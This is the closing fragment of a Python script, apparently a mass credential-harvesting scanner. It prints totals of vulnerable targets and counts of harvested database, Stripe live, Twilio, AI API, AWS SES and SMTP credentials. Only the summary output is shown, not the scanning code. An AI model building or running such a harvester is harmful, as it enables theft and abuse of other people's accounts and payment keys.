    print(f"{Colors.WHITE}Total Targets Scanned:  {len(targets)}{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}Vulnerable Targets:     {stats['vuln']}{Colors.RESET}")
    print(f"{Colors.CYAN}Database Credentials:   {stats['db']}{Colors.RESET}")
    print(f"{Colors.MAGENTA}Stripe Keys (sk_live_): {stats['stripe']}{Colors.RESET}")
    print(f"{Colors.BLUE}Twilio Credentials:     {stats['twilio']}{Colors.RESET}")
    print(f"{Colors.GREEN}AI API Keys:            {stats['ai']}{Colors.RESET}")
    print(f"{Colors.AMBER}AWS SES Credentials:    {stats['ses']}{Colors.RESET}")
    print(f"{Colors.DARK_GREEN}SMTP Credentials:       {stats['smtp']}{Colors.RESET}")
    print(f"\n{Colors.BRIGHT_GREEN}Output Directory: {output_dir}/{Colors.RESET}")

if __name__ == '__main__':
    asyncio.run(main())
